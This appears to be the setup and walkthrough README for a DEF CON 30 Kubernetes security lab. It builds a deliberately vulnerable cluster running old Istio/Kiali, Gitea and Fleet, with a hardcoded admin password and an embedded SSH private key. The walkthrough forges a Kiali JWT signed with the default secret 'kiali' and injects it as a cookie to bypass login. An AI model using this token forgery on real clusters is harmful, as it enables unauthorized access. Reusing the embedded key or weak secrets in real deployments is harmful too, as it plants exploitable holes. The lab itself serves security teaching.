# DEF CON 30 - The Call Is Coming From Inside the Cluster

## Setup

### Prerequisites

- [istioctl v1.4.6](https://github.com/istio/istio/releases/tag/1.4.6)

### Steps

#### Initial Cluster + Istio

 1. Build a kind image that includes open-iscsi (a Longhorn dependency)
    ```shell
    docker build -t defcon30/kind:pwnership .
    ```

 2. Create a kind cluster
    ```shell
    cat <<EOF | kind create cluster --image=defcon30/kind:pwnership --name pwnership --config -
    kind: Cluster
    apiVersion: kind.x-k8s.io/v1alpha4
    nodes:
    - role: control-plane
    - role: worker
      extraPortMappings:
      - containerPort: 31080
        hostPort: 8080
        listenAddress: "127.0.0.1"
        protocol: TCP
      - containerPort: 31022
        hostPort: 2222
        listenAddress: "127.0.0.1"
        protocol: TCP
    EOF
    ```
 3. Install Istio
    ```shell
    istioctl manifest apply --set values.kiali.enabled=true --set values.gateways.istio-ingressgateway.type=NodePort
    ```
 4. Edit the Ingress Gateway, set http2 NodePort to 31080
    ```shell
    kubectl -n istio-system edit svc/istio-ingressgateway
    ```
 5. Create a random secret for Kiali
    ```shell
    kubectl -n istio-system create secret generic kiali --from-literal=username=kiali --from-literal=passphrase=$(openssl rand -base64 12)
    ```
 6. Add a Virtual Service for Kiali
    ```shell
    cat <<EOF |kubectl -n istio-system apply -f -
    apiVersion: networking.istio.io/v1alpha3
    kind: VirtualService
    metadata:
      name: kiali-virtual-service
    spec:
      hosts:
      - "*"
      gateways:
      - ingressgateway
      http:
        - match:
          - uri:
             prefix: /kiali 
          route:
          - destination:
              host: kiali
    EOF
    ```

#### Install Gitea

1. Create the gitops namespace and admin credentials.
   ```shell
   kubectl create ns gitops
   kubectl -n gitops create secret generic git-admin --from-literal=username=git-admin --from-literal=password=supersecret
   helm -n gitops install gitea https://dl.gitea.io/charts/gitea-5.0.9.tgz \
     --set gitea.admin.existingSecret=git-admin \
     --set gitea.config.server.ROOT_URL=http://localhost:8080/gitea/ \
     --set gitea.config.server.DOMAIN=localhost \
     --set gitea.config.server.SSH_DOMAIN=localhost \
     --set gitea.config.server.SSH_PORT=2222 \
     --set service.ssh.type=NodePort \
     --set service.ssh.nodePort=31022
   ```
2. Create the Gitea Virtual Service
   ```shell
   cat <<EOF |kubectl -n gitops apply -f -
   apiVersion: networking.istio.io/v1alpha3
   kind: VirtualService
   metadata:
     name: gitea-virtual-service
   spec:
     hosts:
     - "*"
     gateways:
     - istio-system/ingressgateway
     http:
       - match:
         - uri:
             exact: /gitea
         redirect:
           uri: /gitea/
       - match:
         - uri:
             prefix: /gitea/
         rewrite:
           uri: /
         route:
         - destination:
             host: gitea-http
   EOF
   ```
3. Create the gitops user and add an SSH public key.
   ```
   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6HY7lDW2kSd0V6J/I8PZEG9bYGkl0oXYqowJIjyPxDvnezbfc2fgQiZscb03ySihdMaxtSWJcer93suyYKShM=
   ```
4. Create the ```fleet``` repo.
5. Create the ```my-app``` repo.

#### Install Fleet
1. Create the ```fleet-local``` namespace and add the SSH key Secret.
   ```shell
   kubectl create ns fleet-local
   cat <<EOF |kubectl -n fleet-local apply -f -
   apiVersion: v1
   kind: Secret
   metadata:
     name: gitops-ssh-key
   type: kubernetes.io/ssh-auth
   data:
     ssh-privatekey: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFhQUFBQUJObFkyUnpZUwoxemFHRXlMVzVwYzNSd01qVTJBQUFBQ0c1cGMzUndNalUyQUFBQVFRVGVoMk81UTF0cEVuZEZlaWZ5UEQyUkJ2VzJCcEpkCktGMktxTUNTSThqOFE3NTNzMjMzTm40RUltYkhHOU44a29vWFRHc2JVbGlYSHEvZDdMc21Da29UQUFBQW9EOGEwMVkvR3QKTldBQUFBRTJWalpITmhMWE5vWVRJdGJtbHpkSEF5TlRZQUFBQUlibWx6ZEhBeU5UWUFBQUJCQk42SFk3bERXMmtTZDBWNgpKL0k4UFpFRzliWUdrbDBvWFlxb3dKSWp5UHhEdm5lemJmYzJmZ1FpWnNjYjAzeVNpaGRNYXh0U1dKY2VyOTNzdXlZS1NoCk1BQUFBaEFOZTlpQmdtSzFGTGw2YzdhS3BEU0tXNFNYeWVTOWwyenRmQXZoZmdad2xkQUFBQUFBRUNBd1FGQmdjPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
     ssh-publickey: ZWNkc2Etc2hhMi1uaXN0cDI1NiBBQUFBRTJWalpITmhMWE5vWVRJdGJtbHpkSEF5TlRZQUFBQUlibWx6ZEhBeU5UWUFBQUJCQk42SFk3bERXMmtTZDBWNkovSThQWkVHOWJZR2tsMG9YWXFvd0pJanlQeER2bmV6YmZjMmZnUWlac2NiMDN5U2loZE1heHRTV0pjZXI5M3N1eVlLU2hNPSAK
   EOF
   ```
2. Install Fleet
   ```shell
   helm -n fleet-system install --wait fleet-crd https://github.com/rancher/fleet/releases/download/v0.3.8/fleet-crd-0.3.8.tgz --create-namespace
   helm -n fleet-system install fleet https://github.com/rancher/fleet/releases/download/v0.3.8/fleet-0.3.8.tgz \
     --set bootstrap.repo=git@gitea-ssh.gitops:gitops/fleet.git \
     --set bootstrap.secret=gitops-ssh-key \
     --set bootstrap.branch=main
   ```

## Walkthrough

### Kiali

1. Use https://jwt.io to create a new JWT signed with the secret "kiali".
    - the signing key must be "kiali"
    - "exp" claim with a future timestamp is required (e.g., 1660550400)
    - "iss" claim must be set to "kiali-login"
    - "sub" claim must be a non-empty string
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTc1NzA0MzQsImlzcyI6ImtpYWxpLWxvZ2luIiwic3ViIjoiRXZpbCBEYWdhbiJ9.XYvyZLlKOrI_vj5w6xjvw_PdFp3oyu_mzF5omwSTzxg
   ```
2. Visit http://localhost:8080/kiali/console.
3. Using developer tools, add a cookie named "kiali-token" and set a the value to be the JWT created in step 2.
4. Reload the page.